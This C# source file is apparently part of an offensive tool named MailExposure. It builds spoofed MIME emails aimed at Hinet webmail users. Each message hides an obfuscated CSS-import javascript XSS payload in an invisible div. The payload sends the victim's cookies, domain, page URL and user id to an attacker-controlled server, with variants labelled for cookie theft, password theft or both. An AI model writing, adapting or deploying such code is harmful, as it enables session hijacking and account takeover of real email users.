using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using MailExposure.RecordInfo;

namespace MailExposure.MailXssCode
{
    class Hinet
    {
        // Fields
        private string CRLF;

        // Methods
        public Hinet()
        {
            CRLF = "\r\n";
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            if (model.AttachmentName == null)
            {
                return ("MIME-Version: 1.0" + this.CRLF + "From:" + model.Nickname + "<" + model.Addresser + ">" + this.CRLF + "To:" + model.Addressee + this.CRLF + "Message-Id: <4C204D28.1CBB7D.06708@m12-17.163.com>" + this.CRLF + "Subject:" + model.Subject + this.CRLF + "Content-type:text/html;" + this.CRLF + "Content-Transfer-Encoding:quoted-printable" + this.CRLF + this.CRLF + model.Content + "<div style=3D\"display:none\">" + model.Content + model.XSSCode + this.CRLF + this.CRLF + "." + this.CRLF);
            }
            string code = new StreamReader(model.AttachmentSrc, Encoding.GetEncoding("gb2312")).ReadToEnd();
            return string.Concat(new object[] 
            { 
                "MIME-Version: 1.0", this.CRLF, "Content-Type: multipart/mixed; boundary=Mail_Boundary_00201010", this.CRLF, "From:", model.Nickname, "<", model.Addresser, ">", this.CRLF, "To:", model.Addressee, this.CRLF, "Subject:", model.Subject, this.CRLF, 
                this.CRLF, "Content-Type: multipart/alternative; boundary=Mail_Boundary_00201010", this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=gbk", this.CRLF, "Content-Transfer-Encoding: 7bit", this.CRLF, this.CRLF, this.CRLF, model.Content, "\r\n<div style=3D\"display:none\">", model.Content, model.XSSCode, 
                this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=gbk name=", model.AttachmentName, this.CRLF, "Content-Transfer-Encoding: base64", this.CRLF, "Content-Disposition: attachment;filename=", model.AttachmentName, this.CRLF, this.CRLF, '<', model.EncodeBase64(code), '>', 
                this.CRLF, "--Mail_Boundary_00201010--", this.CRLF, this.CRLF, '.', this.CRLF
            });
        }

        private void Xss(Model model)
        {
            string addressee = model.Addressee;
            int index = addressee.IndexOf('@');
            addressee = addressee.ToLower().Substring(0, index);
            Record record = new Record();
            if (model.Type == "Cookie")
            {
                model.Address = "http://" + record.Dns("") + "/hinet/index.asp?";
                model.XSSCode = "<html><body><STYLE>@im\\port'\\ja\\vasc\\ript:document.location=\"" + model.Address + "\r\ndomain=\"+document.domain+\"&uid=" + model.Addressee + "&url=\"+document.location.href+\"&cookie=\"+escape(document.cookie)';</STYLE></body></html>";
            }
            else if (model.Type == "Password")
            {
                model.Address = "http://" + record.Dns("") + "/hinet/indexp.asp?";
                model.XSSCode = "<html><body><STYLE>@im\\port'\\ja\\vasc\\ript:document.location=\"" + model.Address + "\r\ndomain=\"+document.domain+\"&uid=" + model.Addressee + "&url=\"+document.location.href+\"&cookie=\"+escape(document.cookie)';</STYLE></body></html>";
            }
            else if (model.Type == "C+P")
            {
                model.Address = "http://" + record.Dns("") + "/hinet/indexcp.asp?";
                model.XSSCode = "<html><body><STYLE>@im\\port'\\ja\\vasc\\ript:document.location=\"" + model.Address + "\r\ndomain=\"+document.domain+\"&uid=" + model.Addressee + "&url=\"+document.location.href+\"&cookie=\"+escape(document.cookie)';</STYLE></body></html>";
            }
        }
    }
}
